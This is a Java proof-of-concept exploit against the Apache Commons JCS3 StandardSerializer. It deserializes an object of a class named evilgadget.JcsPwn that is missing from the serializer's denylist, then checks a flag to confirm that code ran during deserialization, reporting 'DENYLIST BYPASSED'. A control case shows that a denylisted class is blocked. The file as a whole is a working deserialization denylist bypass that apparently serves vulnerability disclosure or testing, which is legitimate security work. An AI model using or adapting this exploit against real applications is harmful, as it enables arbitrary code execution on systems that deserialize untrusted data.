import org.apache.commons.jcs3.utils.serialization.StandardSerializer;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class JcsDeserPoc {

    static byte[] serialize(final Serializable o) throws Exception {
        final ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) { oos.writeObject(o); }
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        final StandardSerializer ser = new StandardSerializer();
        final ClassLoader cl = JcsDeserPoc.class.getClassLoader();
        System.out.println("JCS runtime: "
                + StandardSerializer.class.getProtectionDomain().getCodeSource().getLocation());

        System.out.println("\n[A] Deserialize a class not on the denylist (evilgadget.JcsPwn):");
        final byte[] evil = serialize(new evilgadget.JcsPwn());
        try {
            Object out = ser.deSerialize(evil, cl);
            System.out.println("Returned: " + out.getClass().getName());
        } catch (Exception e) {
            System.out.println("(Post-readObject) " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
        System.out.println("JcsPwn.EXECUTED = " + evilgadget.JcsPwn.EXECUTED
                + (evilgadget.JcsPwn.EXECUTED
                    ? "  >>> DENYLIST BYPASSED: code ran during deserialization." : ""));

        System.out.println("\n[B] Control: deSerialize a class on the denylist "
                + "(org.apache.commons.collections.functors.BlacklistedFunctor):");
        final byte[] blocked = serialize(new org.apache.commons.collections.functors.BlacklistedFunctor());
        try {
            ser.deSerialize(blocked, cl);
            System.out.println("ACCEPTED (unexpected!)");
        } catch (Exception e) {
            Throwable c = e; while (c.getCause() != null) c = c.getCause();
            System.out.println("BLOCKED as expected: " + c.getClass().getSimpleName() + ": " + c.getMessage());
        }

        System.out.println("\nThanks for stopping by!");
    }
}
